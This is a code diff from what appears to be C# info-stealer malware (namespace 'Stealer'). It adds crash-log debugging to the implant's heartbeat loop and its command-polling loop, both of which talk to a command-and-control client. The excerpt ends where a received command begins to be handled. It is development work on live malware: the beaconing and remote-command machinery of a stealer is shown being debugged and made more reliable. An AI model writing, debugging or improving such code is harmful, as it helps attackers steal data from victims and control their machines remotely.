@@ -53,21 +53,39 @@ namespace Stealer
 
         private static void HeartbeatLoop()
         {
+            File.AppendAllText(CrashLog, DateTime.Now + " HB THREAD ALIVE\r\n");
             while (true)
             {
-                try { C2Client.SendHeartbeat(_clientId); } catch { }
+                try
+                {
+                    C2Client.SendHeartbeat(_clientId);
+                    File.AppendAllText(CrashLog, DateTime.Now + " HB OK\r\n");
+                }
+                catch (Exception ex)
+                {
+                    File.AppendAllText(CrashLog, DateTime.Now + " HB ERR: " + ex.GetType().Name + ": " + ex.Message + "\r\n");
+                }
                 Thread.Sleep(HeartbeatInterval);
             }
         }
 
         private static void CommandLoop()
         {
+            File.AppendAllText(CrashLog, DateTime.Now + " CMD LOOP ENTER\r\n");
             while (true)
             {
                 try
                 {
                     string cmd = null;
-                    try { cmd = C2Client.PollCommand(_clientId); } catch { }
+                    try
+                    {
+                        cmd = C2Client.PollCommand(_clientId);
+                        File.AppendAllText(CrashLog, DateTime.Now + " POLL OK: " + (cmd ?? "null") + "\r\n");
+                    }
+                    catch (Exception ex)
+                    {
+                        File.AppendAllText(CrashLog, DateTime.Now + " POLL ERR: " + ex.GetType().Name + ": " + ex.Message + "\r\n");
+                    }
 
                     if (!string.IsNullOrEmpty(cmd))
                     {
